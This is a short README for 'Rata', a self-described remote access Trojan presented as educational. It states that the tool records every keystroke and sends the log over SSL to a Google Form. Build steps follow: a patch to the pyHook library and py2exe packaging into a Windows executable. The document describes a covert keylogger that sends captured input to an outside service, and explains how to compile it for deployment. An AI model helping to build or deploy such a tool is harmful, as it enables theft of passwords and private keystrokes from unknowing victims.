# Rata
A remote access Trojan (RAT), for educative security purpose.

# Functionality
Log every single key pressed to a google form, the data is sent over SSL using "cert.pem" as trusted certificates.

# How to build and run
1. Make sure that you have all the imported packages.
2. Go to "lib\site-packages\pyHook\HookManager.py".
3. Replace line 349 with "func = self.keyboard_funcs.get( int(str(msg)) )".
4. Open new terminal.
5. Go to Rata path and execute "python setup.py p2exe".
6. A build folder and a dist folder will be created.
7. Now you can find the executable Rata "dist\main.exe".
